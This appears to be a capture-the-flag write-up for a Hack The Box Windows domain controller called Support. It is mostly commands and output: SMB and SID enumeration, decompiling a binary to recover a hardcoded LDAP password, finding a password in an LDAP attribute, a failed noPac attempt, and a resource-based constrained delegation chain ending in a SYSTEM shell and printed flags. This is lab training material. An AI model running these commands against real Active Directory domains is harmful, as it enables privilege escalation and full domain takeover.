
## NMAP SCAN
```
 nmap -sSCV -p- 10.129.206.135                                                         
Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-23 16:42 +0700
Stats: 0:08:30 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 66.81% done; ETC: 16:55 (0:04:13 remaining)
Nmap scan report for 10.129.206.135
Host is up (0.12s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-23 09:54:50Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
49710/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: -2s
| smb2-time: 
|   date: 2026-04-23T09:55:41
|_  start_date: N/A
```

```
smbclient -L //10.129.206.135/                                  

Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        support-tools   Disk      support staff tools
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.206.135 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

```
smbclient //10.129.206.135/support-tools/ -U '' 

Password for [WORKGROUP\]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Jul 21 00:01:06 2022
  ..                                  D        0  Sat May 28 18:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 18:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 18:19:55 2022
  putty.exe                           A  1273576  Sat May 28 18:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 18:19:31 2022
  UserInfo.exe.zip                    A   277499  Thu Jul 21 00:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 18:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 18:19:43 2022

                4026367 blocks of size 4096. 970789 blocks available

```

got users
```
impacket-lookupsid anonymous@10.129.206.135 -no-pass                               

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at 10.129.206.135
[*] StringBinding ncacn_np:10.129.206.135[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1677581083-3380853377-188903654
498: SUPPORT\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: SUPPORT\Administrator (SidTypeUser)
501: SUPPORT\Guest (SidTypeUser)
502: SUPPORT\krbtgt (SidTypeUser)
512: SUPPORT\Domain Admins (SidTypeGroup)
513: SUPPORT\Domain Users (SidTypeGroup)
514: SUPPORT\Domain Guests (SidTypeGroup)
515: SUPPORT\Domain Computers (SidTypeGroup)
516: SUPPORT\Domain Controllers (SidTypeGroup)
517: SUPPORT\Cert Publishers (SidTypeAlias)
518: SUPPORT\Schema Admins (SidTypeGroup)
519: SUPPORT\Enterprise Admins (SidTypeGroup)
520: SUPPORT\Group Policy Creator Owners (SidTypeGroup)
521: SUPPORT\Read-only Domain Controllers (SidTypeGroup)
522: SUPPORT\Cloneable Domain Controllers (SidTypeGroup)
525: SUPPORT\Protected Users (SidTypeGroup)
526: SUPPORT\Key Admins (SidTypeGroup)
527: SUPPORT\Enterprise Key Admins (SidTypeGroup)
553: SUPPORT\RAS and IAS Servers (SidTypeAlias)
571: SUPPORT\Allowed RODC Password Replication Group (SidTypeAlias)
572: SUPPORT\Denied RODC Password Replication Group (SidTypeAlias)
1000: SUPPORT\DC$ (SidTypeUser)
1101: SUPPORT\DnsAdmins (SidTypeAlias)
1102: SUPPORT\DnsUpdateProxy (SidTypeGroup)
1103: SUPPORT\Shared Support Accounts (SidTypeGroup)
1104: SUPPORT\ldap (SidTypeUser)
1105: SUPPORT\support (SidTypeUser)
1106: SUPPORT\smith.rosario (SidTypeUser)
1107: SUPPORT\hernandez.stanley (SidTypeUser)
1108: SUPPORT\wilson.shelby (SidTypeUser)
1109: SUPPORT\anderson.damian (SidTypeUser)
1110: SUPPORT\thomas.raphael (SidTypeUser)
1111: SUPPORT\levine.leopoldo (SidTypeUser)
1112: SUPPORT\raven.clifton (SidTypeUser)
1113: SUPPORT\bardot.mary (SidTypeUser)
1114: SUPPORT\cromwell.gerard (SidTypeUser)
1115: SUPPORT\monroe.david (SidTypeUser)
1116: SUPPORT\west.laura (SidTypeUser)
1117: SUPPORT\langley.lucy (SidTypeUser)
1118: SUPPORT\daughtler.mabel (SidTypeUser)
1119: SUPPORT\stoll.rachelle (SidTypeUser)
1120: SUPPORT\ford.victoria (SidTypeUser)

```

lets download some smb files and check them.. 
```
## converted it to a readable file.... 
monodis UserInfo.exe > UserInfo.il
```

```
 grep "ldstr" UserInfo.il                                           

          IL_0010:  ldstr "UserInfo.exe"
        IL_0000:  ldstr "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
        IL_000f:  ldstr "armando"
        IL_000d:  ldstr "LDAP://support.htb"
        IL_0012:  ldstr "support\\ldap"

```

got ldap pass... lets confirm it 

```
                                                                                                                                                                                                                                         
┌──(kali㉿kali)-[~]
└─$ crackmapexec smb 10.129.206.135 -u /home/kali/HTB\ BOXES/Support/users.txt -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' 

SMB         10.129.206.135  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.129.206.135  445    DC               [-] support.htb\DC$:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz STATUS_LOGON_FAILURE 
SMB         10.129.206.135  445    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

it works lets look for shares... same shares with same file 
```
ldapsearch -x -H ldap://support.htb -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" "(objectClass=*)" > ldap_dump.txt

                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ ls                                                                                                                                                          
 Desktop   Documents   Downloads   exploits  'HTB BOXES'   ldap_dump.txt   Music   Pictures   Public   Templates   UserInfo.exe   UserInfo.exe.zip   Videos
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ grep -iA 15 "sAMAccountName: support" ldap_dump.txt
sAMAccountName: support
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
dSCorePropagationData: 20220528111201.0Z
dSCorePropagationData: 16010101000000.0Z

# smith.rosario, Users, support.htb
dn: CN=smith.rosario,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: smith.rosario
sn: smith
c: US
l: Chapel Hill
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ grep -iA 2 "info" ldap_dump.txt

msDS-IsDomainFor: CN=NTDS Settings,CN=DC,CN=Servers,CN=Default-First-Site-Name
 ,CN=Sites,CN=Configuration,DC=support,DC=htb
msDS-NcType: 0
--
description: Built-in group used by Internet Information Services.
member: CN=S-1-5-17,CN=ForeignSecurityPrincipals,DC=support,DC=htb
distinguishedName: CN=IIS_IUSRS,CN=Builtin,DC=support,DC=htb
--
 y with information about license issuance, for the purpose of tracking and re
 porting TS Per User CAL usage
distinguishedName: CN=Terminal Server License Servers,CN=Builtin,DC=support,DC
--
 298939 for more information.
distinguishedName: CN=Protected Users,CN=Users,DC=support,DC=htb
instanceType: 4
--
info: Ironside47pleasure40Watchful
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb

```

new creds... support:Ironside47pleasure40Watchful confirmed by netexec 
```
evil-winrm -i 10.129.206.135 -u support -p 'Ironside47pleasure40Watchful'

                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\support\Documents> cd ..
*Evil-WinRM* PS C:\Users\support> cd Desktop 
*Evil-WinRM* PS C:\Users\support\Desktop> type user.txt
16d195eb50d0324c4e9b8b1685097c7a

```

got user flag
lets try to priv esc 

```
faketime "$(ntpdate -q 10.129.206.135 | grep "server" | tail -n 1 | cut -d ' ' -f 1,2)" python3 noPac.py 'support.htb/support:Ironside47pleasure40Watchful' -dc-ip 10.129.206.135 -shell --impersonate Administrator -use-ldap


███    ██  ██████  ██████   █████   ██████ 
████   ██ ██    ██ ██   ██ ██   ██ ██      
██ ██  ██ ██    ██ ██████  ███████ ██      
██  ██ ██ ██    ██ ██      ██   ██ ██      
██   ████  ██████  ██      ██   ██  ██████ 
    
[*] Current ms-DS-MachineAccountQuota = 10
[*] Selected Target dc.support.htb
[*] will try to impersonate Administrator
[*] Adding Computer Account "WIN-L2QKZSK6OJC$"
[*] MachineAccount "WIN-L2QKZSK6OJC$" password = AH49Cejd2R^B
[*] Successfully added machine account WIN-L2QKZSK6OJC$ with password AH49Cejd2R^B.
[*] WIN-L2QKZSK6OJC$ object = CN=WIN-L2QKZSK6OJC,CN=Computers,DC=support,DC=htb
[-] Cannot rename the machine account , Reason 00000523: SysErr: DSID-031A1262, problem 22 (Invalid argument), data 0

[*] Attempting to del a computer with the name: WIN-L2QKZSK6OJC$
[-] Delete computer WIN-L2QKZSK6OJC$ Failed! Maybe the current user does not have permission.
```

failed bcs of the error `problem 22 (Invalid argument)` during the rename phase usually means the Domain Controller has been **patched** against the **noPac** (SAM-the-Admin) exploit.

lets try something else..... 

```
impacket-addcomputer 'support.htb/support:Ironside47pleasure40Watchful' -dc-ip 10.129.206.135 -computer-name 'ATTACKVM$' -computer-pass 'Password123!'

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account ATTACKVM$ with password Password123!.
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ impacket-rbcd 'support.htb/support:Ironside47pleasure40Watchful' -delegate-from 'ATTACKVM$' -delegate-to 'DC$' -dc-ip 10.129.206.135 -action write

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] ATTACKVM$ can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     ATTACKVM$    (S-1-5-21-1677581083-3380853377-188903654-6102)
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ impacket-getST -spn 'cifs/dc.support.htb' -impersonate 'Administrator' 'support.htb/ATTACKVM$:Password123!' -dc-ip 10.129.206.135

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
```

added a new user and got ccache for admin 
lets try to login 
```
export KRB5CCNAME=Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache

mpacket-psexec -k -no-pass dc.support.htb
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on dc.support.htb.....
[*] Found writable share ADMIN$
[*] Uploading file gmLDLKtU.exe
[*] Opening SVCManager on dc.support.htb.....
[*] Creating service iNxH on dc.support.htb.....
[*] Starting service iNxH.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.859]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
f8eb632cb8a0bac6c83ae5a8444beaf3

```

got root flag